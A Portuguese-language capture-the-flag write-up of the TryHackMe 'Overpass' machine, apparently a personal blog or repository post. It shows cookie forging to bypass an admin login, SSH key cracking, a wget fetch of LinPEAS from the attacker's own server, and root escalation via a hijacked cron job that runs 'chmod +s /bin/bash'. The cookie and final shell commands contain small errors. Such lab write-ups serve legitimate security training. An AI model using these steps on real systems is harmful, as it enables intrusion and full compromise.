# Máquina : Overpass(Try Hack Me)

## Enumeração  
````bash
nmap -sC -sV <targetip>
````
A varredura revelou duas portas abertas:  
22 - Rodando serviço SSH.  
80 - Rodando serviço HTTP.    

<img width="808" height="274" alt="nmap" src="https://github.com/user-attachments/assets/7c81520d-c0f0-4de8-9f4e-63120e043eeb" />


Com isso, iniciei a análise da aplicação web disponível na porta 80. A página apresentava um software voltado para armazenamento e gerenciamento de senhas, com a opção de download do sistema.

Para aprofundar a enumeração web, utilizei o Gobuster e identifiquei o diretório "/admin na aplicação.  

<img width="858" height="419" alt="gobusterr" src="https://github.com/user-attachments/assets/bd4ef3c6-ea81-48ee-91d1-31d7adf5dc3c" />


## Exploração

Ao investigar o diretório de admin, havia a opção de login, e a analisar os arquivos JavaScript da aplicação, identifiquei uma falha de lógica na autenticação.

A aplicação utilizava um cookie chamado SessionToken para validar o acesso à área administrativa. No entanto, não havia validação da autenticidade do token, apenas a verificação da existência do cookie.  
<img width="959" height="507" alt="codigo" src="https://github.com/user-attachments/assets/1c982663-811b-4097-9f94-ce1dc42a4588" />

 

Isso significava que qualquer usuário que tivesse um cookie chamado SessionToken seria redirecionado automaticamente para a área de administrador.

Explorando essa falha, utilizei o console do navegador e criei manualmente o cookie:

```bash
cookies.set("SessionToken,"")
```
Após isso, obtive acesso à página de administração da aplicação.

Dentro do painel administrativo, encontrei uma mensagem deixada por um desenvolvedor direcionada a um usuário chamado James, que continha uma chave privada RSA utilizada para autenticação SSH.


<img width="869" height="716" alt="admin" src="https://github.com/user-attachments/assets/727fad42-1528-497f-b1f5-bacce4b33d5f" />



Essa chave estava protegida por senha. Para quebrar essa proteção, utilizei o script ssh2john.py, que converte a chave RSA em um formato compatível com o John The Ripper:

```bash
ssh2john.py rsa > hash
```
Em seguida, utilizei o John The Ripper para quebrar o hash e obter a senha da chave privada:

<img width="314" height="97" alt="hashs" src="https://github.com/user-attachments/assets/ab0718dd-bfe6-437a-9200-f3f06dfb55fd" />


Com a chave RSA e a senha, consegui autenticar via SSH como o usuário james, obtendo acesso ao sistema e capturando a primeira flag: user.txt.

## Escalação de Privilégios
Após o acesso inicial, verifiquei que o usuário james possuía permissão sudo, porém a senha utilizada no SSH não era válida para sudo, impossibilitando a elevação direta de privilégios.

Diante disso, transferi o script LinPEAS para a máquina alvo para identificar possíveis vetores de escalada de privilégios. Para isso, iniciei um servidor HTTP na minha máquina:
```bash
python3 -m http.server 8000
```
E realizei o download do script na máquina alvo.
```bash
wget http://meuip:8000/linpeas.sh
```

A execução do LinPEAS revelou a existência de cron jobs rodando como root, responsáveis por baixar e executar automaticamente um script localizado em:
```bash
downloads/src/buildscript.sh
````
 
<img width="862" height="96" alt="cron" src="https://github.com/user-attachments/assets/d041b502-ab34-4b24-9edb-80f2193c234f" />

cron jobs -Um cron job é uma tarefa automática no Linux que roda em horários definidos(nessa máquina, a cada 1 minuto), sem ninguém precisar executar manualmente, como encontramos um que tem a permissão root nessa máquina, podemos abusar para escalar privilégios. 

O download do arquivo era feito a partir do domínio "overpass.thm".  
Então, na minha máquina:  
Criei a mesma estrutura de diretórios (downloads/src/buildscript.sh) e dentro do aquivo "buildscript.sh" inseri o comando:
```bash
chmod +s /bin/bash
```
-Quando executado, ativaria o bit SUID do bash, o que faria ele rodar como root.  
Abri um servidor http na minha máquina pela porta 80 para servir o arquivo.  

Na máquina alvo:  
Alterei o arquivo /etc/hosts, apontando o domínio overpass.thm para o IP da minha máquina.  

Com isso, quando o cron job foi executado como root, ele baixou e executou o script da minha máquina, aplicando o bit SUID no binário /bin/bash.  

Após aguardar o tempo de execução do cron (cerca de 1 minuto), executei:  
```bash
/bin/bash
```
-p : O parâmetro -p permitiu preservar os privilégios elevados, resultando em uma shell com UID 0 (root).  

Com acesso root, naveguei até o diretório /root e obtive a segunda  e última flag do CTF: "root.txt". Finalizando essa máquina com sucesso.

## Conclusão
A máquina Overpass explora múltiplos conceitos fundamentais de segurança ofensiva, incluindo falhas de lógica em autenticação web, gerenciamento inseguro de tokens, exposição de chaves privadas, quebra de criptografia fraca e escalação de privilégios via cron jobs mal configurados.

A exploração demonstrou como pequenas falhas encadeadas podem levar à comprometimento total do sistema, reforçando a importância de validação adequada de sessões, proteção de segredos sensíveis e cuidado na execução automatizada de scripts com privilégios elevados.
